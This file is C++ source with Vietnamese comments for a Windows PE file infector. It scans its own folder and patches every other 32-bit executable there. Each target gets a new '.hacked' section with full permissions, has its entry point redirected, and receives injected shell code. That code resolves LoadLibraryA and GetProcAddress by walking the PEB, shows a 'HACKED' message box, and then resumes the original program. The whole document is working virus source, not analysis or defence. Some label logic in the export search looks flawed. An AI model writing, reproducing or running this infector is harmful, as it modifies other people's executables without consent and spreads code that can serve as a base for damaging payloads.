#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <tchar.h>

#define NEW_SECTION_SIZE 2048

DWORD alignment(DWORD, DWORD, DWORD);
wchar_t *char_to_wstr(char *);
BOOL infect(char *, const char *);

// Tìm các file để nhiễm
VOID run() {
    HANDLE file_handle;
    WIN32_FIND_DATA directory;
    wchar_t file_name_buffer[150];
    std::vector<std::string> file_names;
    int bytes = GetModuleFileName(NULL, file_name_buffer, 150);

    if (bytes) {
        std::wstring temp_path(file_name_buffer);
        std::string current_path(temp_path.begin(), temp_path.end());
        std::string original_file = current_path;

        // Thiết lập đường dẫn chính xác
        for (int i = current_path.length(); i > 0; i--) {
            current_path.pop_back();
            if (current_path.back() == '\\') {
                current_path.push_back('*');
                break;
            }
        }

        file_handle = ::FindFirstFile((LPCWSTR)char_to_wstr((char *)current_path.c_str()), &directory);
        if (file_handle != INVALID_HANDLE_VALUE) {
            do {
                // Bỏ qua các thư mục
                if (!(directory.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    std::wstring temp(directory.cFileName);
                    std::string temp2(temp.begin(), temp.end());
                    file_names.push_back(temp2);
                }
            } while (::FindNextFile(file_handle, &directory));
            ::FindClose(file_handle);
        }

        current_path.pop_back(); 

        while(file_names.size()) {
            if ((current_path + file_names.back()) != original_file) { 
                printf("Attempting to infect %s\n", file_names.back().c_str());
                if (!infect((char *)((current_path + file_names.back())).c_str(), ".hacked"))
                    printf("Infection successful!\n");
                else
                    printf("Infection failed.\n");
            }
            file_names.pop_back();
        }
    }
}

int main(int argc, char * argv[]) {
    // Thiết lập console để hiển thị chính xác các ký tự
    SetConsoleOutputCP(CP_UTF8);
    
    run();
    return 0;
}

// Thêm mã độc vào file
BOOL infect(char * file_name, const char * section_name) {
    PIMAGE_DOS_HEADER dos_header;
    PIMAGE_FILE_HEADER file_header;
    PIMAGE_OPTIONAL_HEADER optional_header;
    PIMAGE_SECTION_HEADER section_header, first_section, last_section;
    PIMAGE_NT_HEADERS nt_header;

    LARGE_INTEGER file_size;
    BYTE * data, * current_byte, copied_bytes[10000];
    DWORD *temp_address, entry_point, copy_index = 0, old;
    HANDLE in_file = CreateFile(char_to_wstr(file_name), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (in_file == INVALID_HANDLE_VALUE) return 1;

    GetFileSizeEx(in_file, &file_size);
    data = new BYTE[file_size.QuadPart];

    // Đọc file vào bộ nhớ (data) để có thể thay đổi
    ReadFile(in_file, data, file_size.QuadPart, NULL, NULL);

    // Lấy DOS header ban đầu, xác thực xem file có phù hợp để nhiễm không
    dos_header = (PIMAGE_DOS_HEADER)data;

    // Kiểm tra xem có phải file PE không
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
        return 1;

    // Đọc thông tin khác về file sử dụng data làm cơ sở
    file_header = (PIMAGE_FILE_HEADER)(data + dos_header->e_lfanew + sizeof(DWORD));
    optional_header = (PIMAGE_OPTIONAL_HEADER)(data + dos_header->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
    section_header = (PIMAGE_SECTION_HEADER)(data + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    // Chắc chắn không phải file 64 bit
    if (optional_header->Magic != 267) {
        printf("64-bit file detected, aborting infection process.\n");
        return 1;
    }

    // Xóa và sao chép 8 Byte
    // 8 Byte là giá trị tối đa định nghĩa cho tên section
    ZeroMemory(&section_header[file_header->NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&section_header[file_header->NumberOfSections].Name, section_name, 8);

    // Đảm bảo section mới là chính xác
    section_header[file_header->NumberOfSections].Misc.VirtualSize = alignment(NEW_SECTION_SIZE, optional_header->SectionAlignment, 0);
    section_header[file_header->NumberOfSections].VirtualAddress = alignment(section_header[file_header->NumberOfSections - 1].Misc.VirtualSize, optional_header->SectionAlignment, section_header[file_header->NumberOfSections - 1].VirtualAddress);
    section_header[file_header->NumberOfSections].SizeOfRawData = alignment(NEW_SECTION_SIZE, optional_header->FileAlignment, 0);
    section_header[file_header->NumberOfSections].PointerToRawData = alignment(section_header[file_header->NumberOfSections - 1].SizeOfRawData, optional_header->FileAlignment, section_header[file_header->NumberOfSections - 1].PointerToRawData);
    section_header[file_header->NumberOfSections].Characteristics = 0xE00000E0; // Tất cả quyền

    // Thiết lập EOF
    SetFilePointer(in_file, section_header[file_header->NumberOfSections].PointerToRawData + section_header[file_header->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
    SetEndOfFile(in_file);

    // Image lớn hơn với section mới
    optional_header->SizeOfImage = section_header[file_header->NumberOfSections].VirtualAddress + section_header[file_header->NumberOfSections].Misc.VirtualSize;
    file_header->NumberOfSections += 1;

    // Sao chép file trở lại
    SetFilePointer(in_file, 0, NULL, FILE_BEGIN);
    WriteFile(in_file, data, file_size.QuadPart, NULL, NULL);

    nt_header = (PIMAGE_NT_HEADERS)(data + dos_header->e_lfanew);
    nt_header->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    first_section = IMAGE_FIRST_SECTION(nt_header);
    last_section = first_section + (nt_header->FileHeader.NumberOfSections - 1);

    SetFilePointer(in_file, 0, 0, FILE_BEGIN);

    entry_point = nt_header->OptionalHeader.AddressOfEntryPoint + nt_header->OptionalHeader.ImageBase;
    nt_header->OptionalHeader.AddressOfEntryPoint = last_section->VirtualAddress;
    WriteFile(in_file, data, file_size.QuadPart, NULL, 0);

    DWORD start_dword = 0, end_dword = 0; // vị trí quan trọng

    __asm {
        mov eax, start_label
        mov[start_dword], eax

        // Không nhiễm khi chạy
        jmp over 
        start_label :
    }

    __asm {
        // Lấy user32.dll để hiển thị MessageBox
        mov eax, fs:[30h]
        mov eax, [eax + 0x0c]
        mov eax, [eax + 0x14]
        mov eax, [eax]
        mov eax, [eax]
        mov eax, [eax + 0x10]
        mov ebx, eax
        mov eax, [ebx + 0x3c]
        mov edi, [ebx + eax + 0x78]
        add edi, ebx
        mov ecx, [edi + 0x18]
        mov edx, [edi + 0x20]
        add edx, ebx

        // Tìm LoadLibrary
        look_for_lib:
        dec ecx
        mov esi, [edx + ecx * 4]
        add esi, ebx
        cmp dword ptr[esi], 0x64616f4c  // "Load"
        je found_lib_1

        found_lib_1:
        cmp dword ptr[esi + 4], 0x7262694c  // "Libr"
        je found_lib_2

        found_lib_2:
        cmp dword ptr[esi + 8], 0x41797261  // "aryA"
        je comp_found_lib
        jmp look_for_lib

        // LoadLibrary found
        comp_found_lib:
        mov edx, [edi + 0x24]
        add edx, ebx
        mov cx, [edx + 2 * ecx]
        mov edx, [edi + 0x1c]
        add edx, ebx
        mov eax, [edx + 4 * ecx]
        add eax, ebx
        sub esp, 13
        mov ebx, esp

        // LoadLibrary("user32.dll")
        mov byte ptr[ebx], 0x75  // 'u'
        mov byte ptr[ebx + 1], 0x73  // 's'
        mov byte ptr[ebx + 2], 0x65  // 'e'
        mov byte ptr[ebx + 3], 0x72  // 'r'
        mov byte ptr[ebx + 4], 0x33  // '3'
        mov byte ptr[ebx + 5], 0x32  // '2'
        mov byte ptr[ebx + 6], 0x2E  // '.'
        mov byte ptr[ebx + 7], 0x64  // 'd'
        mov byte ptr[ebx + 8], 0x6C  // 'l'
        mov byte ptr[ebx + 9], 0x6C  // 'l'
        mov byte ptr[ebx + 10], 0x00  // null
        push ebx

        call eax  // Gọi LoadLibrary("user32.dll")
        add esp, 13
        push eax

        // Tìm kiếm GetProcAddress
        mov eax, fs:[30h]
        mov eax, [eax + 0x0c]
        mov eax, [eax + 0x14]
        mov eax, [eax]
        mov eax, [eax]
        mov eax, [eax + 0x10]
        mov ebx, eax
        mov eax, [ebx + 0x3c]
        mov edi, [ebx + eax + 0x78]
        add edi, ebx
        mov ecx, [edi + 0x18]
        mov edx, [edi + 0x20]
        add edx, ebx

        look_for_proc_addr:
        dec ecx
        mov esi, [edx + ecx * 4]
        add esi, ebx
        cmp dword ptr[esi], 0x50746547  // "GetP"
        je found_proc_1

        found_proc_1:
        cmp dword ptr[esi + 4], 0x41636f72  // "rocA"
        je found_proc_2

        found_proc_2:
        cmp dword ptr[esi + 8], 0x65726464  // "ddre"
        je comp_found_proc
        jmp look_for_proc_addr

        comp_found_proc:
        mov edx, [edi + 0x24]
        add edx, ebx
        mov cx, [edx + 2 * ecx]
        mov edx, [edi + 0x1c]
        add edx, ebx
        mov eax, [edx + 4 * ecx]
        add eax, ebx
        mov esi, eax
        sub esp, 12
        mov ebx, esp

        // "MessageBoxA"
        mov byte ptr[ebx], 0x4D  // 'M'
        mov byte ptr[ebx + 1], 0x65  // 'e'
        mov byte ptr[ebx + 2], 0x73  // 's'
        mov byte ptr[ebx + 3], 0x73  // 's'
        mov byte ptr[ebx + 4], 0x61  // 'a'
        mov byte ptr[ebx + 5], 0x67  // 'g'
        mov byte ptr[ebx + 6], 0x65  // 'e'
        mov byte ptr[ebx + 7], 0x42  // 'B'
        mov byte ptr[ebx + 8], 0x6F  // 'o'
        mov byte ptr[ebx + 9], 0x78  // 'x'
        mov byte ptr[ebx + 10], 0x41  // 'A'
        mov byte ptr[ebx + 11], 0x00  // null
        
        mov eax, [esp + 12]  // user32.dll handle
        push ebx  // "MessageBoxA"
        push eax  // user32.dll handle
        call esi  // GetProcAddress(user32.dll, "MessageBoxA")
        add esp, 12
        
        // Chuẩn bị MessageBox với "HACKED"
        sub esp, 10
        mov ebx, esp
        
        // Nội dung "HACKED"
        mov dword ptr[ebx], 0x4B434148  // "HACK"
        mov word ptr[ebx + 4], 0x4445   // "ED"
        mov byte ptr[ebx + 6], 0x00     // null

        // Tiêu đề (cũng là "HACKED")
        mov dword ptr[ebx + 7], 0x4B434148  // "HACK"
        mov word ptr[ebx + 11], 0x4445     // "ED"
        mov byte ptr[ebx + 13], 0x00       // null

        // MessageBoxA(NULL, "HACKED", "HACKED", MB_ICONWARNING | MB_OK);
        push 0x30      // MB_ICONWARNING | MB_OK
        lea ecx, [ebx + 7]
        push ecx       // Title
        push ebx       // Message
        push 0         // NULL
        call eax       // Call MessageBoxA
        add esp, 14    // Dọn stack

        mov eax, 0xFADED420
        jmp eax
    }

    __asm {
        over:
        mov eax, e
        mov[end_dword], eax
        e:
    }

    current_byte = ((byte *)(start_dword));

    while (copy_index < ((end_dword + 90) - start_dword)) {
        temp_address = ((DWORD*)((byte*)start_dword + copy_index));
        if (*temp_address == 0xFADED420) {
            VirtualProtect((LPVOID)temp_address, 4, PAGE_EXECUTE_READWRITE, &old);
            *temp_address = entry_point;
        }

        copied_bytes[copy_index] = current_byte[copy_index++];
    }

    SetFilePointer(in_file, last_section->PointerToRawData, NULL, FILE_BEGIN);
    WriteFile(in_file, copied_bytes, copy_index - 1, NULL, 0);
    CloseHandle(in_file);

    return 0;
}

// Căn chỉnh dữ liệu để file PE hợp lệ
DWORD alignment(DWORD size, DWORD align, DWORD addr) {
    if (!(size % align))
        return addr + size;

    return addr + (size / align + 1) * align;
}

// Chuyển đổi char* thành wchar_t*
wchar_t *char_to_wstr(char * a) {
    wchar_t *s = new wchar_t[512];
    MultiByteToWideChar(CP_ACP, 0, a, -1, s, 512);
    return s;
} 